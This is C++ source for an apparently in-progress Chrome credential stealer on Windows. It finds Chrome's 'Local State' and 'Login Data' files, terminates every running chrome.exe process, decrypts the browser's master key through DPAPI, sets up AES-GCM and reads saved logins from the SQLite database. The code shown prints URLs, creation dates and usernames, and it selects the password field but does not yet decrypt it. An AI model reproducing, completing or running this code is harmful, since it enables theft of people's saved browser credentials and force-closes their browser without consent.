#include "chrome.hxx"

#include "crypt.hxx"
#include "nowide.hxx"
#include <iostream>
#include <fstream>
#include <ShlObj.h>
#include <windows.h>
#include <tlhelp32.h>
#include <sqlite3.h>
#include <wil/resource.h>
#include <nlohmann/json.hpp>

chrome::chrome() {
    std::filesystem::path base_path = get_base_path();
    m_key_path    = base_path / "Local State";
    m_logins_path = base_path / "Default" / "Login Data";

    if (!(std::filesystem::exists(m_key_path) && std::filesystem::exists(m_logins_path))) {
        return;
    }

    if (BCryptOpenAlgorithmProvider(&m_aes_alg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
        return;
    }

    BCryptSetProperty(m_aes_alg.get(), BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof (BCRYPT_CHAIN_MODE_GCM), 0);

    m_valid = true;
}

std::filesystem::path chrome::get_base_path(void) {
    wil::unique_cotaskmem_string local_appdata_path;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL,
                         &local_appdata_path);

    std::filesystem::path base_path = local_appdata_path.get();

    return base_path / "Google" / "Chrome" / "User Data";
}

void chrome::get(void) {
    // can't open database if chrome is running
    kill();

    std::fstream key_file(m_key_path);

    std::vector<uint8_t> key_data;
    using json = nlohmann::json;
    try {
        json j = json::parse(key_file);
        std::string key_data_b64 = j["os_crypt"]["encrypted_key"];
        std::cout << "key_data_b64 = " << key_data_b64 << "\n";
        key_data = b64_decode(&key_data_b64[0]);
    } catch (json::exception &) {
        std::cerr << "json exception\n";
        return;
    }

    key_data.erase(key_data.begin(), key_data.begin() + 5);
    key_data = dpapi_decrypt(key_data);
    wil::unique_bcrypt_key key = import_key_data(m_aes_alg, key_data);


    using unique_sqlite3 = wil::unique_any<sqlite3 *, decltype(&sqlite3_close), sqlite3_close>;
    using unique_sqlite3_stmt = wil::unique_any<sqlite3_stmt *, decltype(&sqlite3_finalize), sqlite3_finalize>;

    unique_sqlite3 db;
    if (sqlite3_open(m_logins_path.string().c_str(), &db) != SQLITE_OK) {
        std::cerr << "error opening databse\n";
        return;
    }

    unique_sqlite3_stmt statement;
    if (sqlite3_prepare_v2(db.get(),
            "SELECT action_url, date_created, username_value, password_value FROM logins",
            -1, &statement, NULL) != SQLITE_OK) {
        std::cerr << "error preparing statement\n";
        return;
    }

    int step_ret = 0;
    while ((step_ret = sqlite3_step(statement.get())) == SQLITE_ROW) {
        std::string action_url = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 0));
        std::string date_created = format_time(sqlite3_column_int64(statement.get(), 1));
        std::string username_value = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 2));
        std::cout << "action url: " << action_url << "\n";
        std::cout << "date_created: " << date_created << "\n";
        std::cout << "username_value: " << username_value << "\n";
    }
    if (step_ret != SQLITE_DONE) {
        return; // TODO:
    }
}

void chrome::kill(void) const {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof (PROCESSENTRY32W);

    wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));
    if (!Process32FirstW(snapshot.get(), &entry)) { return; }
    do {
        if (narrow(entry.szExeFile) == "chrome.exe") {
            wil::unique_handle process(
                    OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID));
            if (process) {
                TerminateProcess(process.get(), 0);
            }
        }
    } while (Process32NextW(snapshot.get(), &entry));
}

std::string chrome::format_time(sqlite3_int64 t) {
    // time since epoch is stored by chrome as microseconds but by FILETIME as 100-nanosecond intervals
    // https://docs.microsoft.com/en-us/windows/win32/sysinfo/file-times
    // https://source.chromium.org/chromium/chromium/src/+/main:base/time/time.h;l=505;drc=721e6d70189ce1350f8ff733a02c98b9bc8e8251
    t *= 10;

    // FILETIME describes a 64-bit value
    FILETIME ft;
    ft.dwHighDateTime = (t & 0xFFFFFFFF00000000) >> 32; // 32 most significant bits
    ft.dwLowDateTime = t & 0xFFFFFFFF; // 32 least significant bits

    SYSTEMTIME st;
    FileTimeToSystemTime(&ft, &st);

    const char *format = "%d-%02d-%02d %02d:%02d:%02d.%03d UTC";
    const int size = std::snprintf(nullptr, 0, format, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    std::string ret(size + 1, '\0');
    std::sprintf(&ret[0], format, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    return ret;
}
